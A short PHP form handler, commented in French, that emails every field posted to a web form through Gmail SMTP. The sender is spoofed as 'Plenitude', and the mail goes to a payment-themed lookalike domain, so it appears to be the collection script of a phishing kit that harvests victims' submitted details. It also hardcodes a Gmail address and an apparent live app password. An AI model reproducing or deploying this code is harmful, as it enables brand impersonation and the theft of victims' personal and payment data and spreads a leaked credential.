<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

$mail = new PHPMailer(true);

try {
   // Configuration du serveur SMTP
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Serveur SMTP de Gmail
            $mail->SMTPAuth = true;
            $mail->Username = 'scottmayzie@gmail.com'; // Remplacez par votre adresse Gmail
            $mail->Password = 'itipzjmsptsyolny'; // Remplacez par votre mot de passe d'application Gmail
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;
    $mail->setFrom('pagamento@serviziofinanzieri.it.com', 'Plenitude');
    $mail->addAddress('pagamento@serviziofinanzieri.it.com');

    $mail->isHTML(true);
    $mail->Subject = 'Nouvelle soumission de formulaire';
    $mail->Body    = 'Données reçues :<br><pre>' . print_r($_POST, true) . '</pre>';

    $mail->send();
    echo 'Message envoyé avec succès.';
} catch (Exception $e) {
    echo "Erreur lors de l'envoi : {$mail->ErrorInfo}";
}
?>
